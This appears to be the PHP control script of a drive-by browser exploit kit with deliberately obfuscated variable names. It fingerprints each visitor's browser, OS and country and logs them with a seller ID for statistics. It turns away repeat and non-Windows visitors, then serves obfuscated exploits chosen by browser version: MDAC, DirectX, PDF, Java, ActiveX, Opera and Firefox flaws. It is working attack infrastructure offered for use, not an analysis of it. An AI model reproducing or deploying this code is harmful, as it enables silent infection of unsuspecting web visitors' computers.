<?php
//error_reporting(0);
			header("Cache-Control: no-store, no-cache, must-revalidate");
			header("Expires: Thu, 01 Jan 2000 00:00:00 GMT");
			header("Last-Modified:  Thu, 01 Jan 2000 00:00:00 GMT");
			header("Pragma: no-cache");
			

include'config.php';
include'functions.php';
include'exp.php';

mysql_connect($db_host, $db_user, $db_pass);
mysql_select_db($db_name);

$OOOOOO000 = $_GET['br'];
$OOOOO0000[2] = $_GET['vers'];




$OOOOOOO00 = base64_decode($OOOOOOO00);
$OOOOOOOO0 = base64_encode($OOOOOOOO0);
$OOOO00000 = $_GET['s'];
if (!isset($_GET['spl']))
{$O00000000 = $_SERVER['REMOTE_ADDR'];
$q = mysql_query("select ip from statistic where ip='".$O00000000."'");
$n = mysql_num_rows($q);
@mysql_free_result($q);
if ($n != 0)  {die(header("Location: ".$redir_not_uniq));} 


detect_brows();
detect_os();

$OOO000000 = detect_country($O00000000);
$br = $OOOOOO000 . " " .$OOOOO0000[2];
@$OO0000000 = $_SERVER['HTTP_REFERER'];
$ref=parse_url($OO0000000);
@$ref=$ref['host'];
$ref=$ref;
$_GET["spl"] ="1";
$q = mysql_query("insert into statistic (date, ip, os, br, country, refer,seller) values ('".date("Y-m-d H:i:s", time())."', '".$O00000000."', '".$os."', '".$br."', '".$OOO000000."','".$ref."','".$OOOO00000."')");
@mysql_free_result($q);

		_OOOOOOO0;
		if (!eregi("Windows", $os))  { die; exit; }
		if ($os == "Windows CE")  { die; exit; }
}
_OOOOOO00;



$O0000000O = $_GET["spl"];


//          INTERNET EXPLORER                  //
if ($OOOOOO000 == "MSIE")
{
echo "<html><body>";	
	if ($OOOOO0000[2] < "7")
	{	
		switch ($O0000000O) {
		case 1:_crypt(mdac().next_spl(2));						break;
		case 2:_crypt(next_spl(10).pdf_ie());						break;
		case 34:_crypt(DirectX_DS7().next_spl(2));				break;
		case 3:echo activex_pack().java_exec().soc(); die;							break;
		}
	}
	elseif (($OOOOO0000[2] >= "7") and ($OOOOO0000[2] < "8"))
	{

		switch ($O0000000O) {
		case 1:_crypt(next_spl(10).pdf_ie());						break;
		case 2:_crypt(mem_cor().next_spl(2));					break;
		case 3:echo activex_pack().java_exec().soc();die;							break;
							}

	}
	else
	{
	if ($os !== "Windows Vista") { _crypt(pdf_ie());}	
	echo java_exec().soc();die;
	}
}

//                 OPERA                      //
elseif ($OOOOOO000 == "Opera")
{
	if ($OOOOO0000[2] <= "9.21")
	{
	_crypt(op_telnet());
	}
echo pdf_2();
echo java_exec();
_crypt(soc());
}

//                   FireFox                               //
elseif ($OOOOOO000 == "FireFox")
{
	if ($OOOOO0000[2] <= "1.1")
	{
	_crypt(compareTo());
	}
	elseif ($OOOOO0000[2] == "1.5")
	{
	_crypt(jno());	
	}
	elseif ($OOOOO0000[2] == "3.5") 
	{
	echo font_tags();
	}
	else 
	{
	//_crypt(pdf_ff());
	}
_crypt(wmp());
echo pdf_2();
echo java_exec();
echo soc();
}
else
{
_crypt(pdf_all());
echo java_exec();
echo soc();
}

?>
